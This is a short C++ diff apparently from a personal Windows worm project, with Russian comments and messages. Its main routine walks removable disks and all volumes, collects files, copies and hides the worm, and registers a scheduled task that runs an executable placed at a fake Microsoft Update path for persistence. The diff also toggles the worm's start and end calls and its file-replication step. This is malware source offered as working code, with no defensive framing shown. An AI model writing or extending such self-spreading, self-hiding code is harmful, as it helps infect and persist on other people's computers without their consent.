@@ -29,12 +29,12 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	// часть с работой самого червя
 	
-	//worm1.worm_was_started();
+	worm1.worm_was_started();
 	worm1.process_all_removable_disks();
 	worm1.scan_all_volumes();
 	//worm1.print_list_dir();
 	worm1.collect_visible_files();
-	worm1.replicate_files(5);
+	//worm1.replicate_files(5);
 	worm1.copy_and_hide_worm();
 	worm1.create_scheduled_task(L"C:\\Users\\sseva\\AppData\\Roaming\\Microsoft\\Update\\update.exe");
 	//worm1.print_file_to_copy();
@@ -64,6 +64,5 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	else {
 		std::wcout << L"Не удалось подключиться к серверу.\n";
 	}
-
-	//worm1.worm_was_end();
+	worm1.worm_was_end();
 }
